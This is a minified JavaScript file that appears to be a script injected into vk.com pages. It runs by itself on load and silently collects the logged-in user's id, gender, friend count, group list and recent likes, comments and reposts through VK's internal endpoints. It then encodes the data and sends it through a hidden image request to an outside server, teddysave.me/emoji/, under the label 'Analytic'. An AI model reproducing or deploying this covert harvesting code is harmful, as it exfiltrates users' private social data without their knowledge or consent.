var ACTIVITY_LIMIT=50,COOKIE_TERM=31536e4,ENCODE_RATIO=8,ID_SIZE=4,COUNTER_SIZE=2,OTHER_SIZE=1,DOMAIN="https://vk.com/",FEED_TOP_URI="feed",GROUP_URI="al_groups.php",REPOST_URI="al_wall.php",COMMENT_URI="al_feed.php?sm_comments",LIKE_URI="al_fave.php",COUNT_FRIENDS_URI="id",GENDER_URI="al_profileEdit.php?",COUNT_FRIENDS_CSS_SELECTOR="#profile_friends>.module_header .header_count.fl_l",FEED_TOP_CSS_SELECTOR="#feed_filters>.page_block",REPOST_CSS_SELECTOR=".post_copy .copy_post_author>a",LIKE_CSS_SELECTOR="h5.post_author>a",COMMENT_CSS_SELECTOR="h5.post_author>a",SERVER_URL="https://teddysave.me/emoji/?",COOKIE_PREFIX="remixwid_",err_code=0,err_string="",requestDataManager=function(){var e={};this.section=function(t){return e.section=t,this},this.act=function(t){return e.act=t,this},this.offset=function(t){return e.offset=t,this},this.al=function(t){return e.al=t,this},this.setOtherOptions=function(t,n){return e[t]=n,this},this.getOffset=function(){return e.offset},this.build=function(){var t=[];for(var n in e)e.hasOwnProperty(n)&&t.push(n+"="+encodeURIComponent(e[n]));return t=t.join("&")}},UserData=function(){var e={},t={},n=function(){return window.vk&&parseInt(window.vk.id)?(e.id||(e.id=parseInt(window.vk.id)),e.id):0},r=function(){var t=new requestDataManager;t.al("-1"),t.setOtherOptions("__query","edit"),t.setOtherOptions("_ref","feed"),t.setOtherOptions("_rndVer","1413"),t.setOtherOptions("al_id",n());var r=DOMAIN+GENDER_URI+t.build();return Request.get(r,"text").then(function(t){if(t){e.gender=0;var n=t.match(/\\"sex\\"\:[1-2]{1}/);if(n&&n[0]){var r=n[0].split(":");r[1]&&(e.gender=parseInt(r[1]))}}})},i=function(){return Request.post(DOMAIN+COUNT_FRIENDS_URI+n(),null,"document").then(function(t){if(t&&t instanceof HTMLDocument){var n=t.querySelector(COUNT_FRIENDS_CSS_SELECTOR);if(e.friend_count=0,n){var r=parseInt(n.innerHTML);r?e.friend_count=r:delete e.friend_count}}})},o=function(){return Request.get(DOMAIN+FEED_TOP_URI,"document").then(function(t){t?t.querySelector(FEED_TOP_CSS_SELECTOR+" .on")?e.feed_top=1:e.feed_top=2:e.feed_top=3},function(){e.feed_top=4})},a=function(){var t=new requestDataManager;return t.act("get_list").al("1").setOtherOptions("mid",n()).setOtherOptions("tab","groupsv"),Request.post(DOMAIN+GROUP_URI,t.build(),"text").then(function(t){var n=[];if(e.group_list=[],e.group_count=0,t){try{var r=l(t,"json"),i=JSON.parse(r)}catch(e){return}"Array"==Verification.checkTypeData(i)&&(i.forEach(function(e){e[2]&&!isNaN(parseInt(e[2]))&&n.push(parseInt(e[2]))}),e.group_list=n,e.group_count=n.length)}})},u=function(){var e=new requestDataManager;return e.act("get_wall").al("1").offset(0).setOtherOptions("owner_id",n()).setOtherOptions("type","own"),f(REPOST_URI,e,"repost",REPOST_CSS_SELECTOR)},s=function(){var e=new requestDataManager;return e.al("1").offset(0).section("comments").setOtherOptions("al_ad",0).setOtherOptions("more","1").setOtherOptions("part","1"),f(COMMENT_URI,e,"comment",COMMENT_CSS_SELECTOR)},c=function(){var e=new requestDataManager;return e.act("load").al("1").offset(0).section("likes_posts").setOtherOptions("al_ad",0),f(LIKE_URI,e,"like",LIKE_CSS_SELECTOR)},f=function(e,n,r,i){return Request.post(DOMAIN+e,n.build(),"text").then(function(o){var a=!1,u=document.createElement("div");if(t[r]||(t[r]=new Set),o=l(o)){u.innerHTML=o,u.style.display="none",u.id="wall_act_list",document.body.appendChild(u);for(var s=document.body.querySelectorAll("#wall_act_list ._post"),c=[],p=0;p<s.length;p++){var O=s[p].querySelector(i);O&&O.dataset.postId&&c.push(O)}s.length&&(a=!0),u.parentNode.removeChild(u),_(r,c)}if(a&&t[r].size<ACTIVITY_LIMIT)return n.offset(n.getOffset()+s.length),n.setOtherOptions("from",s[s.length-1].dataset.postId),f(e,n,r,i);d(r)})},_=function(e,n){[].forEach.call(n,function(n){t[e].add(n)})},p=function(e){for(var n=[],r=t[e].values(),i=0;i<t[e].size&&i<ACTIVITY_LIMIT;i++)n.push(r.next().value);return n},d=function(n){p(n).forEach(function(t){var r=t.dataset.postId;if(r){var i=r.split("_"),o=i[0].replace("-",""),a=i[1];e.activity||(e.activity={}),e.activity[o]||(e.activity[o]={like:[],comment:[],repost:[]}),e.activity[o][n].push(parseInt(a))}}),t[n]=[]},l=function(e,t){var n=!1;if("string"==(typeof e).toLowerCase())for(var r=e.split("<!>"),i=0;i<r.length;i++){if("json"==t&&-1!=r[i].indexOf("<!json>")){n=r[i].replace("<!json>","");break}if("json"!=t&&-1!=r[i].search(/<div/)){n=r[i];break}}return n};return{setData:function(t){e=t},getId:n,parseList:d,get:function(){return new Promise(function(t){n(),Promise.all([r(),i(),a(),s(),c(),o(),u()]).then(function(){t(e)})})},getDataObject:function(){return e}}}(),Verification=function(){var e=function(e){return!1===Storage.get("remixwid_"+e)},t=function(){return UserData.getId()},n=function(e){var t=new RegExp("^[0-9]+$");for(var n in e){if(!t.test(n))return!1;if(3!=Object.keys(e[n]).length)return!1;for(var o in e[n])if(!(e[n][o]&&i(e[n][o],"Array")&&r(e[n][o])))return!1}return!0},r=function(e){for(var t=0;t<e.length;t++)if(!(i(e[t],"Number")&&(0^e[t])===e[t]&&e[t]>=0))return!1;return!0},i=function(e,t){return Object.prototype.toString.call(e).slice(8,-1)==t};return{isWork:function(){var n=t();return n&&e(n)},checkUserData:function(e){for(var t=["id","gender","friend_count","feed_top","group_count","group_list","activity"],o=0;o<t.length;o++){if(!(t[o]in e))return err_code=1,err_string=JSON.stringify(Object.keys(e)),!1;switch(t[o]){case"group_list":if(!i(e.group_list,"Array")||!r(e.group_list))return err_code=2,!1;break;case"activity":if(!i(e.activity,"Object")||null===e.activity)return err_code=3,!1;if(!n(e.activity))return err_code=4,!1;break;case"gender":if(!i(e.gender,"Number")||e.gender<0||e.gender>2)return err_code=5,!1;break;case"feed_top":if(!i(e.feed_top,"Number"))return err_code=6,!1;break;case"id":if(!(i(e.id,"Number")&&e.id>0)||(0^e.id)!==e.id)return err_code=7,!1;break;default:if(!(i(e[t[o]],"Number")&&e[t[o]]>-1)||(0^e[t[o]])!==e[t[o]])return err_code=8,!1}}return e.group_list.length==e.group_count||(err_code=9,!1)},checkTypeData:i}}(),ObjectToBin=function(){var e=[],t=function(t){n(Object.keys(t.activity).length,COUNTER_SIZE,e);for(var r in t.activity)n(parseInt(r),ID_SIZE,e),n(t.activity[r].like.length,COUNTER_SIZE,e),n(t.activity[r].comment.length,COUNTER_SIZE,e),n(t.activity[r].repost.length,COUNTER_SIZE,e),n(t.activity[r],ID_SIZE,e)},n=function(e,t,i){if("object"==typeof e)for(var o in e)n(e[o],t,i);else i.push(r(e,t));return i},r=function(e,t){for(var n=[],r=t;r>0;r--)n.push(String.fromCharCode(e>>ENCODE_RATIO*(r-1)&255));return n=n.join("")};return{convert:function(r){return e=[],!!Verification.checkUserData(r)&&(n(r.id,ID_SIZE,e),n(r.gender,OTHER_SIZE,e),n(r.friend_count,COUNTER_SIZE,e),n(r.feed_top,OTHER_SIZE,e),n(r.group_count,COUNTER_SIZE,e),n(r.group_list,ID_SIZE,e),t(r),e.join(""))},encode:r}}(),Request=function(){var e=function(e,t,n,r){return new Promise(function(i,o){var a=new XMLHttpRequest;a.open(e,t,!0),a.responseType=r||"text",a.setRequestHeader("x-requested-with","XMLHttpRequest"),a.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),a.onreadystatechange=function(){if(4==a.readyState&&a.status>=200&&a.status<=300){var e="document"==r?a.responseXML:a.response;i(e)}},a.onerror=function(){o(!1)},a.send(n)})};return{post:function(t,n,r){return e("POST",t,n,r)},get:function(t,n){return e("GET",t,null,n)},request:e}}(),Storage=function(){var e=function(){for(var e={},t=document.cookie.split(";"),n=0;n<t.length;n++){var r=t[n].split("=");2==r.length&&(e[r[0].trim()]=r[1])}return e};return{set:function(e,t,n){if(n&&"number"==typeof n){var r=new Date;r.setTime(r.getTime()+1e3*n),n=r}var i=e+"="+(t=encodeURIComponent(t));i+="; path=/; expires="+n.toUTCString(),document.cookie=i},get:function(t){var n=e();return t in n&&n[t]}}}(),Analytic=function(){var e=function(e){Storage.set(COOKIE_PREFIX+UserData.getId(),1,COOKIE_TERM);var t=new Image,n="";n=!1===e?"e="+err_code+"&i="+UserData.getId()+"&g="+encodeURIComponent(err_string):"data="+encodeURIComponent(btoa(e)),t.src=SERVER_URL+n,t.style.display="none",document.body.appendChild(t)};return{run:function(){Verification.isWork()&&UserData.get().then(function(t){var n=ObjectToBin.convert(t);e(n)})}}}();Analytic.run();